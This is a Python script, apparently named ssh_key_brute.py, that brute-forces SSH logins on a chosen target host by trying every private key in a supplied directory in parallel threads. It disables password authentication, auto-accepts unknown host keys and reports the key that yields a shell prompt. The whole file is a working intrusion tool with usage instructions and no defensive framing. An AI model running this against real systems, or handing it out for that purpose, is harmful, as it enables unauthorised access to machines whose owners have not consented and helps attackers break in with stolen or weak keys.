import pexpect
import optparse
import os
from threading import *

# Maximum number of simultaneous connections
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user, host, keyfile, release):
    """
    Attempt to connect to the specified host using SSH with the provided keyfile.

    Parameters:
    user (str): The username for SSH login.
    host (str): The target host's address.
    keyfile (str): The path to the SSH keyfile.
    release (bool): A flag indicating if the connection lock should be released after the attempt.
    """
    global Stop
    global Fails

    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = f'ssh {user}@{host} -i {keyfile}{opt}'
        child = pexpect.spawn(connStr)

        # Expect specific outputs from the SSH command
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])

        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)  # Retry after adding to known_hosts
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    """
    Main function to parse command line arguments and initiate SSH key testing.
    """
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()

    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    # Validate required options
    if host is None or passDir is None or user is None:
        print(parser.usage)
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)

        if Fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)

        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        thread = Thread(target=connect, args=(user, host, fullpath, True))
        thread.start()  # Start a new thread for the connection attempt


# Usage: python ssh_key_brute.py -H <target_host> -u <username> -d <directory_with_keys>
# To authenticate to SSH with a key, type ssh user@host –i keyfile –o PasswordAuthentication=no
if __name__ == '__main__':
    main()
